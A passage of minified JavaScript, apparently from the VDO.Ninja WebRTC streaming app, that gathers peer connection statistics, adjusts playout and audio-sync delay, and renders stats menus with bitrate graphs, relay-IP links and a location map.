candidate;if("candidateType"in(candidate=candidates[nominatedCandidate.remoteCandidateId]))if(session.rpcs[UUID].stats["Peer-to-Peer_Connection"].candidateType_remote=candidate.candidateType,"relay"===candidate.candidateType)"ip"in candidate?session.rpcs[UUID].stats["Peer-to-Peer_Connection"].remote_relay_IP=candidate.ip:delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].remote_relay_IP,"relayProtocol"in candidate?session.rpcs[UUID].stats["Peer-to-Peer_Connection"].remote_relay_protocol=candidate.relayProtocol:delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].remote_relay_protocol,session.rpcs[UUID].stats["Peer-to-Peer_Connection"].remote_ip_blocking=!ipleakingAllowedRemote;else try{delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].remote_relay_IP,delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].remote_relay_protocol,delete session.rpcs[UUID].stats["Peer-to-Peer_Connection"].remote_ip_blocking}catch(e){}"networkType"in candidate&&(session.rpcs[UUID].stats["Peer-to-Peer_Connection"].remote_networkType=candidate.networkType)}playoutdelay(UUID),setTimeout((function(){session.directorSpeakerMute(),session.directorDisplayMute()}),0)}}))}catch(e){errorlog(e)}pokeIframeAPI("view-stats-updated",!0,UUID)}}function createConnectionDetailsEle(UUID){return!!session.rpcs[UUID]&&(session.rpcs[UUID].connectionDetails=document.createElement("div"),session.rpcs[UUID].connectionDetails.id="remoteConnections_"+UUID,session.rpcs[UUID].stats.info&&"total_outbound_p2p_connections"in session.rpcs[UUID].stats.info&&(session.rpcs[UUID].connectionDetails.innerText="ğŸ”—"+session.rpcs[UUID].stats.info.total_outbound_p2p_connections,session.rpcs[UUID].connectionDetails.dataset.value=session.rpcs[UUID].stats.info.total_outbound_p2p_connections),session.rpcs[UUID].connectionDetails.dataset.UUID=UUID,session.rpcs[UUID].connectionDetails.title=getTranslation("viewer-count"),session.rpcs[UUID].connectionDetails.className="rem-con-count",session.rpcs[UUID].connectionDetails.addEventListener("click",(function(e){log("clicked connectionDetails icon ");try{if(e.preventDefault(),!1!==session.statsMenu){var uid=e.currentTarget.dataset.UUID;if("stats"in session.rpcs[uid]){var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,uid),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,uid)}}return e.stopPropagation(),!1}catch(e){errorlog(e)}})),!0)}function playoutdelay(UUID){try{var target_buffer=session.buffer;try{!1!==session.rpcs[UUID].buffer&&(target_buffer=session.rpcs[UUID].buffer)}catch(e){warnlog(e)}if(!1!==target_buffer){target_buffer=parseFloat(target_buffer);var receivers=getReceivers2(UUID).reverse()||[];session.rpcs[UUID].whep&&(receivers=receivers.concat(getReceiversMC(UUID).reverse())),receivers.forEach((function(receiver){try{for(var tid in session.rpcs[UUID].stats)if("object"==typeof session.rpcs[UUID].stats[tid]&&"_trackID"in session.rpcs[UUID].stats[tid]&&session.rpcs[UUID].stats[tid]._trackID===receiver.track.id&&session.rpcs[UUID].stats[tid]._type==receiver.track.kind&&"Jitter_Buffer_ms"in session.rpcs[UUID].stats[tid]){var sync_offset=0;if(session.rpcs[UUID].stats[tid]._sync_offset?sync_offset=session.rpcs[UUID].stats[tid]._sync_offset||0:session.rpcs[UUID].stats[tid]._sync_offset=0,sync_offset+=target_buffer,sync_offset-=session.rpcs[UUID].stats[tid].Jitter_Buffer_ms||0,session.includeRTT&&session.rpcs[UUID].stats["Peer-to-Peer_Connection"]&&(sync_offset-=parseInt(session.rpcs[UUID].stats["Peer-to-Peer_Connection"].Round_Trip_Time_ms/2)||0),sync_offset>target_buffer&&(sync_offset=target_buffer||0),sync_offset<0&&(sync_offset=0),session.rpcs[UUID].stats[tid].Added_Buffer_Delay_ms=sync_offset||0,session.rpcs[UUID].stats["Peer-to-Peer_Connection"]&&(session.rpcs[UUID].stats[tid].Total_Playout_Delay_ms=sync_offset+parseInt(session.rpcs[UUID].stats["Peer-to-Peer_Connection"].Round_Trip_Time_ms/2)+session.rpcs[UUID].stats[tid].Jitter_Buffer_ms||0),"audio"==session.rpcs[UUID].stats[tid]._type){if(session.rpcs[UUID].stats[tid]._sync_offset=sync_offset||0,receiver.playoutDelayHint=parseFloat(sync_offset/1e3)||0,!1!==session.sync){var audio_delay=session.sync||0;if(audio_delay+=target_buffer-session.rpcs[UUID].stats[tid].Jitter_Buffer_ms||0,"audio"==receiver.track.kind&&receiver.track.id in session.rpcs[UUID].inboundAudioPipeline&&session.rpcs[UUID].inboundAudioPipeline[receiver.track.id]&&session.rpcs[UUID].inboundAudioPipeline[receiver.track.id].delayNode){audio_delay<0&&(audio_delay=0);try{session.rpcs[UUID].inboundAudioPipeline[receiver.track.id].delayNode.delayTime.linearRampToValueAtTime(parseFloat(audio_delay/1e3),session.audioCtx.currentTime+parseFloat(session.statsInterval/9e3))}catch(e){session.rpcs[UUID].inboundAudioPipeline[receiver.track.id].delayNode.delayTime.setValueAtTime(parseFloat(audio_delay/1e3),session.audioCtx.currentTime+1)}session.rpcs[UUID].stats[tid].Audio_Sync_Delay_ms=audio_delay||0}}}else"video"==session.rpcs[UUID].stats[tid]._type&&(session.rpcs[UUID].stats[tid]._sync_offset=sync_offset||0,receiver.playoutDelayHint=parseFloat(sync_offset/1e3)||0)}}catch(e){errorlog(e)}}))}}catch(e){errorlog(e),warnlog("device does not support playout delay")}}function printViewStats(menu,UUID){if(!1===session.statsMenu)return!1;if(!session.rpcs[UUID])return menu.innerHTML="<br /><br /><br />Remote Publisher Disconnected",!1;var statsObj=session.rpcs[UUID].stats,streamID=session.rpcs[UUID].streamID,scrollLeft=menu.scrollLeft,scrollTop=menu.scrollTop;return menu.innerHTML="StreamID: <b>"+streamID+"</b><br />",menu.innerHTML+=printValues(statsObj),menu.scrollTop=scrollTop,menu.scrollLeft=scrollLeft,!0}function plotDataSimple(canvas,bitrate,nacks=0){canvas.height=50,canvas.width=124,canvas.className="canvasStats";var context=canvas.getContext("2d");isNaN(bitrate)&&(bitrate=0),isNaN(nacks)&&(nacks=0);var height=context.canvas.height,width=context.canvas.width,val=(10-nacks)/10;val>1?val=1:val<0&&(val=0);var x=width-1,y=height-bitrate*(height/4e3);context.fillStyle=getColor(val),context.fillRect(x,y,1,height),context.fillStyle="#FFFFFF55",context.fillRect(x,y-2,1,4),y-5>0&&(context.fillStyle="#FFFFFF44",context.fillRect(x,y+2,1,1)),context.putImageData(context.getImageData(1,0,width-1,height),0,0),context.clearRect(width-1,0,1,height)}function printValues(obj,sort=!1){var out="",keys=Object.keys(obj);sort&&keys.sort();var lat=!1,lon=!1;return keys.forEach((key=>{if("object"==typeof obj[key]){if(null!=obj[key]){var tmp=key;tmp=sanitizeChat(tmp),out+="<li><h2 title='"+tmp+"'>"+tmp+"</h2></li>",out+="info"==key?printValues(obj[key]):printValues(obj[key],!0)}}else if(key.startsWith("_"));else try{var unit="",value=obj[key],stat=sanitizeChat(key);stat=stat.charAt(0).toUpperCase()+stat.slice(1);var hint="";if("string"==typeof obj[key]&&(value=sanitizeChat(value)),"useragent"==key&&(value="<span style='cursor: pointer;' onclick='copyFunction(this.innerText,event);' title='Copy this user-agent to the clipboard' style='cursor:pointer'>"+value+"</span>"),"Bitrate_in_kbps"==key){unit=" kbps";stat="Bitrate",hint="You can refer to the documentation for ways to increase the target bitrate"}else if("type"==key){unit="";stat="Type","Audio Track"==value&&(value="ğŸ”Š "+value),"Video Track"==value&&(value="ğŸ“º "+value)}else if("packetLoss_in_percentage"==key){unit=" %";stat="Packet Loss ğŸ“¶",value=parseInt(1e4*parseFloat(value))/1e4,hint="A high packet loss will lower quality of the media"}else if("local_relay_IP"==key)value="<a href='https://whatismyipaddress.com/ip/"+value+"' target='_blank'>"+value+"</a>";else if("remote_relay_IP"==key)value="<a href='https://whatismyipaddress.com/ip/"+value+"' target='_blank'>"+value+"</a>";else if("local_ip_blocking"==key&&value)value="âš ï¸ You're blocking",hint="no direct p2p connection made because of YOUR browser or system setting";else if("remote_ip_blocking"==key&&value)console.error("??"),value="âš ï¸ They're blocking",hint="no direct p2p connection made because of THEIR browser or system setting";else if("candidateType_local"==key&&"relay"==value)value="ğŸ’¸ relay server",hint="no direct p2p connection made; using the TURN relay servers.",stat="Candidate type - Local";else if("candidateType_remote"==key&&"relay"==value)value="ğŸ’¸ relay server",hint="no direct p2p connection made; using the TURN relay servers.",stat="Candidate type - Remote";else if("candidateType_local"==key&&"host"==value)hint="No NAT firewall, typical of LAN to LAN",stat="Candidate type - Local";else if("candidateType_remote"==key&&"host"==value)hint="No NAT firewall, typical of LAN to LAN",stat="Candidate type - Remote";else if("candidateType_local"==key&&"srflx"==value)hint="direct p2p, but NAT firewall likely",stat="Candidate type - Local";else if("candidateType_remote"==key&&"srflx"==value)hint="direct p2p, but NAT firewall likely",stat="Candidate type - Remote";else if("height_url"==key){if(0==value)return}else if("width_url"==key){if(0==value)return}else if("height_url"==key){if(0==value)return}else if("version"==key)stat="VDO.Ninja Version";else if("platform"==key)stat="Platform (OS)";else if("iPhone12Up"==key)stat="iPhone 12 and up";else if("aec_url"==key)stat="Echo-Cancellation";else if("agc_url"==key)stat="Auto-Gain (agc)";else if("denoise_url"==key)stat="De-noising ";else if("audio_level"==key)stat="Audio Level";else if("Jitter_Buffer_ms"==key){unit=" ms";stat="Jitter Buffer Delay"}else if("Added_Buffer_Delay_ms"==key){unit=" ms";stat="Added Buffer Delay",hint="Value of playout buffer delay added if using &buffer"}else if("Total_Playout_Delay_ms"==key){unit=" ms";stat="Total Playout Delay",hint="Network latency + Jitter buffer + any manually added playout delay"}else if(null===value)value="null";else if("stereo_url"==key)stat="Pro-Audio<br />(Stereo-mode)",3==value?value="3 (outbound hi-fi)<br />Use Headphones":1==value?value="1 (in & out hi-fi)<br />Use Headphones":2==value?value="3 (inbound hi-fi)":4==value?value="3 (multichannel)<br />Use Headphones":5==value&&(value="5 (auto-mode)<br />Use Headphones");else{if(!1===value)return;if("false"===value)return;if("lat"==key){if((lat=value)&&lon){const mapWidth=250,mapHeight=250,x=(lon+180)*(mapWidth/360),mapRatio=mapHeight/mapWidth,latRad=lat*Math.PI/180,y=mapHeight/2-mapWidth*Math.log(Math.tan(Math.PI/4+latRad/2))/(2*Math.PI)*mapRatio;out+='<div class="map-container" style="position: relative;width:'+mapWidth+"px;height:"+mapHeight+'px;">\t\t\t\t\t\t\t\t<img src="./media/Wikimedia_mercator_modded_cc_by-sa_3.0.png" alt="World Map" style="width:'+mapWidth+"px; height:"+mapHeight+';">\t\t\t\t\t\t\t\t<div class="marker" style="position: absolute; width: 6px; height: 6px; background-color: red; border-radius: 50%; left: '+(x-3)+"px; top: "+(y-3)+'px;"></div>\t\t\t\t\t\t\t</div>'}}else if("lon"==key&&(lon=value,lat&&lon)){const mapWidth=250,mapHeight=250,x=(lon+180)*(mapWidth/360),mapRatio=mapHeight/mapWidth,latRad=lat*Math.PI/180,y=mapHeight/2-mapWidth*Math.log(Math.tan(Math.PI/4+latRad/2))/(2*Math.PI)*mapRatio;out+='<div class="map-container" style="position: relative;width:'+mapWidth+"px;height:"+mapHeight+'px;">\t\t\t\t\t\t\t\t<img src="./media/Wikimedia_mercator_modded_cc_by-sa_3.0.png" alt="World Map" style="width:'+mapWidth+"px; height:"+mapHeight+';">\t\t\t\t\t\t\t\t<div class="marker" style="position: absolute; width: 6px; height: 6px; background-color: red; border-radius: 50%; left: '+(x-3)+"px; top: "+(y-3)+'px;"></div>\t\t\t\t\t\t\t</div>',out+='<a href="https://www.google.com/maps?q='+lat+","+lon+'" style="color:lightblue;text-align:center;margin:0 auto;" target="_blank">Open Location in Google Maps</a>'}}stat=(stat=stat.replaceAll("_"," ")).trim(),out+=hint?"<li style='cursor:help;' title='"+hint+"'><span>"+stat+"</span><span>"+value+unit+"</span></li>":"<li><span>"+stat+"</span><span>"+value+unit+"</span></li>"}catch(e){warnlog(e)}})),out}function processMeshcastStats(UUID){try{session.rpcs[UUID].whep.getStats().then((function(stats){if(UUID in session.rpcs){session.rpcs[UUID].stats.WHEP_Connection||(session.rpcs[UUID].stats.WHEP_Connection={});var nominatedCandidate=!1,candidates={};if(stats.forEach((stat=>{if(!stat.id||!stat.id.startsWith("DEPRECATED_")){var trackID=stat.trackIdentifier||stat.id||!1;if("remote-candidate"==stat.type)candidates[stat.id]=stat,"relay"!=stat.candidateType&&!0;else if("local-candidate"==stat.type)candidates[stat.id]=stat,"relay"!=stat.candidateType&&!0;else if("candidate-pair"==stat.type&&stat.nominated)nominatedCandidate?nominatedCandidate.priority<stat.priority&&(nominatedCandidate=stat):nominatedCandidate=stat;else if("track"==stat.type&&stat.remoteSource)stat.id in session.rpcs[UUID].stats?(session.rpcs[UUID].stats[stat.id]._trackID=stat.trackIdentifier,session.rpcs[UUID].stats[stat.id].Jitter_Buffer_ms=parseInt(1e3*(parseFloat(stat.jitterBufferDelay)-session.rpcs[UUID].stats[stat.id]._jitter_delay)/(parseInt(stat.jitterBufferEmittedCount)-session.rpcs[UUID].stats[stat.id]._jitter_count))||0,session.rpcs[UUID].stats[stat.id]._jitter_delay=parseFloat(stat.jitterBufferDelay)||0,session.rpcs[UUID].stats[stat.id]._jitter_count=parseInt(stat.jitterBufferEmittedCount)||0,"frameWidth"in stat&&"frameHeight"in stat&&(session.rpcs[UUID].stats[stat.id].Resolution=stat.frameWidth+" x "+stat.frameHeight,session.rpcs[UUID].stats[stat.id]._frameWidth=stat.frameWidth,session.rpcs[UUID].stats[stat.id]._frameHeight=stat.frameHeight)):(session.rpcs[UUID].stats[stat.id]={},session.rpcs[UUID].stats[stat.id]._jitter_delay=parseFloat(stat.jitterBufferDelay)||0,session.rpcs[UUID].stats[stat.id]._jitter_count=parseInt(stat.jitterBufferEmittedCount)||0,session.rpcs[UUID].stats[stat.id].Jitter_Buffer_ms=0,session.rpcs[UUID].stats[stat.id]._trackID=stat.trackIdentifier,stat.kind&&"audio"==stat.kind?(session.rpcs[UUID].stats[stat.id].type="Audio Track",session.rpcs[UUID].stats[stat.id]._type="audio"):stat.kind&&"video"==stat.kind&&(session.rpcs[UUID].stats[stat.id].type="Video Track",session.rpcs[UUID].stats[stat.id]._type="video"));else if("transport"==stat.type)"bytesReceived"in stat&&("_bytesReceived"in session.rpcs[UUID].stats.WHEP_Connection&&session.rpcs[UUID].stats.WHEP_Connection._timestamp&&stat.timestamp&&(session.rpcs[UUID].stats.WHEP_Connection.total_recv_bitrate_kbps=parseInt(8*(stat.bytesReceived-session.rpcs[UUID].stats.WHEP_Connection._bytesReceived)/(stat.timestamp-session.rpcs[UUID].stats.WHEP_Connection._timestamp))),session.rpcs[UUID].stats.WHEP_Connection._bytesReceived=stat.bytesReceived),"timestamp"in stat&&(session.rpcs[UUID].stats.WHEP_Connection._timestamp=stat.timestamp,session.rpcs[UUID].stats.WHEP_Connection._timestampStart?session.rpcs[UUID].stats.WHEP_Connection.time_active_minutes=parseInt((stat.timestamp-session.rpcs[UUID].stats.WHEP_Connection._timestampStart)/600)/100:session.rpcs[UUID].stats.WHEP_Connection._timestampStart=stat.timestamp);else if("inbound-rtp"==stat.type&&trackID){if(session.rpcs[UUID].stats[trackID]=session.rpcs[UUID].stats[trackID]||{},stat.trackIdentifier&&(session.rpcs[UUID].stats[trackID]._trackID=stat.trackIdentifier),"jitterBufferDelay"in stat&&(session.rpcs[UUID].stats[trackID].Jitter_Buffer_ms=parseInt(1e3*(parseFloat(stat.jitterBufferDelay)-session.rpcs[UUID].stats[trackID]._jitter_delay_2)/(parseInt(stat.jitterBufferEmittedCount)-session.rpcs[UUID].stats[trackID]._jitter_count_2))||0,session.rpcs[UUID].stats[trackID]._jitter_delay_2=parseFloat(stat.jitterBufferDelay)||0,session.rpcs[UUID].stats[trackID]._jitter_count_2=parseInt(stat.jitterBufferEmittedCount)||0),"frameWidth"in stat&&"frameHeight"in stat&&(session.rpcs[UUID].stats[trackID].Resolution=stat.frameWidth+" x "+stat.frameHeight,session.rpcs[UUID].stats[trackID]._frameWidth=stat.frameWidth,session.rpcs[UUID].stats[trackID]._frameHeight=stat.frameHeight),session.rpcs[UUID].stats[trackID].Bitrate_in_kbps=parseInt(8*(stat.bytesReceived-(session.rpcs[UUID].stats[trackID]._last_bytes||0))/(stat.timestamp-session.rpcs[UUID].stats[trackID]._last_time)),session.rpcs[UUID].stats[trackID]._last_bytes=stat.bytesReceived||session.rpcs[UUID].stats[trackID]._last_bytes,session.rpcs[UUID].stats[trackID]._last_time=stat.timestamp||session.rpcs[UUID].stats[trackID]._last_time,session.rpcs[UUID].stats._codecId=stat.codecId,session.rpcs[UUID].stats._codecIdTrackId=trackID,"video"==stat.mediaType){if(session.rpcs[UUID].stats[trackID].type="Video Stream",session.rpcs[UUID].stats[trackID]._type="video",session.obsfix&&"codec"in session.rpcs[UUID].stats&&"video/VP8"==session.rpcs[UUID].stats.codec?(session.rpcs[UUID].stats[trackID].pliDelta=stat.pliCount-session.rpcs[UUID].stats[trackID].keyFramesRequested_pli||0,session.rpcs[UUID].stats[trackID].nackTrigger=stat.nackCount-session.rpcs[UUID].stats[trackID].streamErrors_nackCount+session.rpcs[UUID].stats[trackID].nackTrigger||0,log("OBS PLI FIX MODE ON"),0===session.rpcs[UUID].stats[trackID].pliDelta&&session.rpcs[UUID].stats[trackID].nackTrigger>=session.obsfix?(session.requestKeyframe(UUID),session.rpcs[UUID].stats[trackID].nackTrigger=0,log("TRYING KEYFRAME")):session.rpcs[UUID].stats[trackID].pliDelta>0&&(session.rpcs[UUID].stats[trackID].nackTrigger=0)):session.obsfix&&"codec"in session.rpcs[UUID].stats&&"video/VP9"==session.rpcs[UUID].stats.codec&&(session.rpcs[UUID].stats[trackID].pliDelta=stat.pliCount-session.rpcs[UUID].stats[trackID].keyFramesRequested_pli||0,session.rpcs[UUID].stats[trackID].nackTrigger=stat.nackCount-session.rpcs[UUID].stats[trackID].streamErrors_nackCount+session.rpcs[UUID].stats[trackID].nackTrigger||0,log("OBS PLI FIX MODE ON"),0===session.rpcs[UUID].stats[trackID].pliDelta&&session.rpcs[UUID].stats[trackID].nackTrigger>=4*session.obsfix?(session.requestKeyframe(UUID),session.rpcs[UUID].stats[trackID].nackTrigger=0,log("TRYING KEYFRAME")):session.rpcs[UUID].stats[trackID].pliDelta>0&&(session.rpcs[UUID].stats[trackID].nackTrigger=0)),session.rpcs[UUID].stats[trackID].keyFramesRequested_pli=stat.pliCount||0,session.rpcs[UUID].stats[trackID].streamErrors_nackCount=stat.nackCount||0,"framesPerSecond"in stat)session.rpcs[UUID].stats[trackID].FPS=parseInt(stat.framesPerSecond);else if("framesDecoded"in stat&&stat.timestamp){var lastFramesDecoded=0,lastTimestamp=0;try{lastFramesDecoded=session.rpcs[UUID].stats[trackID]._framesDecoded,lastTimestamp=session.rpcs[UUID].stats[trackID]._timestamp}catch(e){}session.rpcs[UUID].stats[trackID].FPS=parseInt(10*(stat.framesDecoded-lastFramesDecoded)/(stat.timestamp/1e3-lastTimestamp))/10,session.rpcs[UUID].stats[trackID]._framesDecoded=stat.framesDecoded,session.rpcs[UUID].stats[trackID]._timestamp=stat.timestamp/1e3}}else"audio"==stat.mediaType&&(session.rpcs[UUID].stats[trackID].type="Audio Stream",session.rpcs[UUID].stats[trackID]._type="audio","audioLevel"in stat&&(session.rpcs[UUID].stats[trackID].audio_level=parseInt(1e4*parseFloat(stat.audioLevel))/1e4));"packetsLost"in stat&&"packetsReceived"in stat&&("_packetsLost"in session.rpcs[UUID].stats[trackID]||(session.rpcs[UUID].stats[trackID]._packetsLost=stat.packetsLost),"_packetsReceived"in session.rpcs[UUID].stats[trackID]||(session.rpcs[UUID].stats[trackID]._packetsReceived=stat.packetsReceived),"packetLoss_in_percentage"in session.rpcs[UUID].stats[trackID]||(session.rpcs[UUID].stats[trackID].packetLoss_in_percentage=0),session.rpcs[UUID].stats[trackID].packetLoss_in_percentage=.35*session.rpcs[UUID].stats[trackID].packetLoss_in_percentage+100*(stat.packetsLost-session.rpcs[UUID].stats[trackID]._packetsLost)*.65/(stat.packetsReceived-session.rpcs[UUID].stats[trackID]._packetsReceived+(stat.packetsLost-session.rpcs[UUID].stats[trackID]._packetsLost))||0,"video"===session.rpcs[UUID].stats[trackID]._type&&(qos=session.rpcs[UUID].stats[trackID].packetLoss_in_percentage),session.rpcs[UUID].signalMeter&&"video"===session.rpcs[UUID].stats[trackID]._type&&(session.rpcs[UUID].stats[trackID].packetLoss_in_percentage<.01?0==session.rpcs[UUID].stats[trackID].Bitrate_in_kbps?session.rpcs[UUID].signalMeter.dataset.level=0:session.rpcs[UUID].signalMeter.dataset.level=5:session.rpcs[UUID].stats[trackID].packetLoss_in_percentage<.3?session.rpcs[UUID].signalMeter.dataset.level=4:session.rpcs[UUID].stats[trackID].packetLoss_in_percentage<1?session.rpcs[UUID].signalMeter.dataset.level=3:session.rpcs[UUID].stats[trackID].packetLoss_in_percentage<3.5?session.rpcs[UUID].signalMeter.dataset.level=2:session.rpcs[UUID].signalMeter.dataset.level=1),session.rpcs[UUID].stats[trackID]._packetsReceived=stat.packetsReceived,session.rpcs[UUID].stats[trackID]._packetsLost=stat.packetsLost)}else"_codecId"in session.rpcs[UUID].stats&&stat.id==session.rpcs[UUID].stats._codecId?("mimeType"in stat&&(session.rpcs[UUID].stats[session.rpcs[UUID].stats._codecIdTrackId]||(session.rpcs[UUID].stats[session.rpcs[UUID].stats._codecIdTrackId]={}),session.rpcs[UUID].stats[session.rpcs[UUID].stats._codecIdTrackId].codec=stat.mimeType),"frameHeight"in stat&&"frameWidth"in stat&&(session.rpcs[UUID].stats.Resolution=parseInt(stat.frameWidth)+" x "+parseInt(stat.frameHeight))):Firefox&&("mimeType"in stat&&"type"in stat&&"id"in stat&&"codec"==stat.type&&(stat.mimeType.includes("video")?session.rpcs[UUID].stats.video_codec=stat.mimeType.split("video/")[1]:stat.mimeType.includes("audio")&&(session.rpcs[UUID].stats.audio_codec=stat.mimeType.split("audio/")[1],stat.clockRate?(session.rpcs[UUID].stats.audio_clockRate=stat.clockRate,stat.channels&&(session.rpcs[UUID].stats.audio_clockRate+=" / "+stat.channels)):stat.sdpFmtpLine&&(session.rpcs[UUID].stats.fmtp=stat.sdpFmtpLine))),"frameWidth"in stat&&(session.rpcs[UUID].stats.resolution=stat.frameWidth+" x "+stat.frameHeight,"framesPerSecond"in stat&&(session.rpcs[UUID].stats.resolution+=" @ "+stat.framesPerSecond)),"bytesReceived"in stat&&("kind"in stat&&"video"==stat.kind?("_bytesReceived_video"in session.rpcs[UUID].stats&&(session.rpcs[UUID].stats.videoBitrate_kbps=parseInt((stat.bytesReceived-session.rpcs[UUID].stats._bytesReceived_video)/(1024*session.statsInterval/8e3))),session.rpcs[UUID].stats._bytesReceived_video=stat.bytesReceived):"kind"in stat&&"audio"==stat.kind&&("_bytesReceived_audio"in session.rpcs[UUID].stats&&(session.rpcs[UUID].stats.audioBitrate_kbps=parseInt((stat.bytesReceived-session.rpcs[UUID].stats._bytesReceived_audio)/(1024*session.statsInterval/8e3))),session.rpcs[UUID].stats._bytesReceived_audio=stat.bytesReceived)))}})),nominatedCandidate&&"currentRoundTripTime"in nominatedCandidate&&(session.rpcs[UUID].stats.WHEP_Connection.Round_Trip_Time_ms=1e3*nominatedCandidate.currentRoundTripTime),nominatedCandidate&&nominatedCandidate.remoteCandidateId)if(candidates[nominatedCandidate.remoteCandidateId])if("candidateType"in(candidate=candidates[nominatedCandidate.remoteCandidateId])){if(session.rpcs[UUID].stats.WHEP_Connection.candidateType_remote=candidate.candidateType,"relay"===candidate.candidateType)"relayProtocol"in candidate&&(session.rpcs[UUID].stats.WHEP_Connection.remote_relay_protocol=candidate.relayProtocol),"ip"in candidate&&(session.rpcs[UUID].stats.WHEP_Connection.remote_relay_IP=candidate.ip);else try{delete session.rpcs[UUID].stats.WHEP_Connection.local_relay_IP,delete session.rpcs[UUID].stats.WHEP_Connection.local_relay_protocol}catch(e){}"networkType"in candidate&&(session.rpcs[UUID].stats.WHEP_Connection.remote_networkType=candidate.networkType)}if(nominatedCandidate&&nominatedCandidate.localCandidateId&&candidates[nominatedCandidate.localCandidateId]){var candidate;if("candidateType"in(candidate=candidates[nominatedCandidate.localCandidateId]))if(session.rpcs[UUID].stats.WHEP_Connection.candidateType_local=candidate.candidateType,"relay"===candidate.candidateType)"relayProtocol"in candidate&&(session.rpcs[UUID].stats.WHEP_Connection.local_relay_protocol=candidate.relayProtocol),"ip"in candidate&&(session.rpcs[UUID].stats.WHEP_Connection.local_relay_IP=candidate.ip);else try{delete session.rpcs[UUID].stats.WHEP_Connection.local_relay_IP,delete session.rpcs[UUID].stats.WHEP_Connection.local_relay_protocol}catch(e){}"networkType"in candidate&&(session.rpcs[UUID].stats.WHEP_Connection.local_networkType=candidate.networkType)}playoutdelay(UUID)}}))}catch(e){errorlog(e)}}function printMyStats(menu,screenshare=!1){if(session){var scrollLeft=getById("menuStatsBox").scrollLeft,scrollTop=getById("menuStatsBox").scrollTop;menu.innerHTML="";try{session.stats.outbound_connections=Object.keys(session.pcs).length,session.stats.inbound_connections=Object.keys(session.rpcs).length}catch(e){}try{var obscam=!1;if(document.querySelector("select#videoSource3")){var videoSelect=document.querySelector("select#videoSource3").options;videoSelect.length&&(videoSelect[videoSelect.selectedIndex].text.startsWith("OBS-Camera")||videoSelect[videoSelect.selectedIndex].text.startsWith("OBS Virtual Camera"))&&(obscam=!0)}session.streamSrc&&session.streamSrc.getVideoTracks().forEach((function(track){if(session.currentCameraConstraints=track.getSettings(),screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio):window.matchMedia("(orientation: portrait)").matches||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio),obscam&&30==parseInt(session.currentCameraConstraints.frameRate))session.stats.video_settings=(session.currentCameraConstraints.width||0)+"x"+(session.currentCameraConstraints.height||0);else{var frameRateFPS=session.currentCameraConstraints.frameRate;session.stats.video_settings=frameRateFPS?(session.currentCameraConstraints.width||0)+"x"+(session.currentCameraConstraints.height||0)+" @ "+parseInt(100*frameRateFPS)/100+"fps":(session.currentCameraConstraints.width||0)+"x"+(session.currentCameraConstraints.height||0)}}))}catch(e){errorlog(e)}for(var uuid in printViewValues(session.stats),menu.innerHTML+="<button onclick='session.forcePLI(null,event);' data-translate='send-keyframe-to-viewer'>Send Keyframe to Viewers</button>",!screenshare&&session.meshcast&&session.whipOut&&session.whipOut.stats?(printViewValues({Meshcast_connection:session.whipOut.stats}),menu.innerHTML+="<hr>"):!screenshare&&session.whipOut&&session.whipOut.stats&&(printViewValues({Whip_Out_connection:session.whipOut.stats}),menu.innerHTML+="<hr>"),!screenshare&&session.whepIn&&session.whepIn.stats&&(printViewValues({Whep_In_connection:session.whepIn.stats}),menu.innerHTML+="<hr>"),session.pcs)screenshare?session.pcs[uuid].realUUID&&(printViewValues(session.pcs[uuid].stats,uuid),menu.innerHTML+="<hr>"):session.pcs[uuid].realUUID||(printViewValues(session.pcs[uuid].stats,uuid),menu.innerHTML+="<hr>");(iOS||iPad)&&(menu.innerHTML+="<br /><div style='height:100px'></div>");try{getById("menuStatsBox").scrollLeft=scrollLeft,getById("menuStatsBox").scrollTop=scrollTop}catch(e){}}function printViewValues(obj,UUID=!1){if(document.getElementById("menuStatsBox")){var keys=Object.keys(obj);keys.sort(),keys.forEach((key=>{if("object"==typeof obj[key]){try{var tmp=key;"info"===(tmp=sanitizeChat(tmp))&&(tmp="Remote Peer Info"),menu.innerHTML+="<li><h2 title='"+tmp+"'>"+tmp+"</h2></li>"}catch(e){}printViewValues(obj[key]),menu.innerHTML+="<hr />"}})),UUID&&session.pcs[UUID]&&session.pcs[UUID].restartIce&&(menu.innerHTML+="<button onclick='session.pcs[\""+UUID+"\"].restartIce();' title='This will trigger an ICE Restart, which may or may not help with some connection issues'>Restart connection</button>"),keys.forEach((key=>{if("object"!=typeof obj[key]){if(key.startsWith("_"))return;let unit="",hint="";var stat=sanitizeChat(key);stat=stat.charAt(0).toUpperCase()+stat.slice(1);var value=obj[key];if("string"==typeof value&&(value=sanitizeChat(value)),!1===value)return;"useragent"==key&&(value="<span style='cursor: pointer;' onclick='copyFunction(this.innerText,event);' title='Copy this user-agent to the clipboard' style='cursor:pointer'>"+value+"</span>"),"local_relay_IP"==key&&(value="<a href='https://whatismyipaddress.com/ip/"+value+"' target='_blank'>"+value+"</a>"),"remote_relay_IP"==key&&(value="<a href='https://whatismyipaddress.com/ip/"+value+"' target='_blank'>"+value+"</a>"),"watch_URL"==key&&(value="<a title='The standalone Meshcast.io view link for this stream' href='"+value+"' target='_blank'>"+value+"</a>"),"candidateType_local"==key&&"relay"==value?(stat="Candidate type - Local",value="ğŸ’¸ <p style='cursor:help;' title='no direct p2p connection made; using the TURN relay servers.'>relay server</p>"):"candidateType_remote"==key&&"relay"==value?(stat="Candidate type - Remote",value="ğŸ’¸ <p style='cursor:help;' title='no direct p2p connection made; using the TURN relay servers.'>relay server</p>"):"candidateType_local"==key&&"host"==value?(stat="Candidate type - Local",value="<p style='cursor:help;' title='No NAT firewall, typical of LAN to LAN'>host</p>"):"candidateType_remote"==key&&"host"==value?(stat="Candidate type - Remote",value="<p style='cursor:help;' title='No NAT firewall, typical of LAN to LAN'>host</p>"):"candidateType_local"==key&&"srflx"==value?(stat="Candidate type - Local",value="<p style='cursor:help;' title='direct p2p, but NAT firewall likely'>srflx</p>"):"candidateType_remote"==key&&"srflx"==value?(stat="Candidate type - Remote",value="<p style='cursor:help;' 